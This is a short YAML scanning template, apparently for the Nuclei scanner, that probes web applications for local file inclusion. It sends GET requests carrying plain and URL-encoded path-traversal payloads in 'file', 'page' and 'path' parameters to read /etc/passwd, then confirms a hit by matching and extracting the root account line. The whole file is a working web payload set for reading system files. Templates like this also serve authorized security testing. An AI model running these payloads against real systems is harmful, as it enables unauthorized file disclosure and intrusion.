id: THENAWABX_FOUND_LFI
info:
  name: 📂 Nawab-Confirmed-LFI 📂
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}?file=/etc/passwd"
      - "{{BaseURL}}?page=/etc/passwd"
      - "{{BaseURL}}?path=/etc/passwd"
      - "{{BaseURL}}?file=../../../../../../../../etc/passwd"
      - "{{BaseURL}}?page=../../../../../../../../etc/passwd"
      - "{{BaseURL}}?path=../../../../../../../../etc/passwd"
      - "{{BaseURL}}?file=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "root:x:0:0:"

      - type: word
        part: body
        negative: true
        words:
          - "example"
          - "tutorial"
          - "placeholder"
          - "syntax"
          - "W3Schools"

    extractors:
      - type: regex
        part: body
        regex:
          - "root:x:0:0:[^:]+:[^:]+:[^:]+"
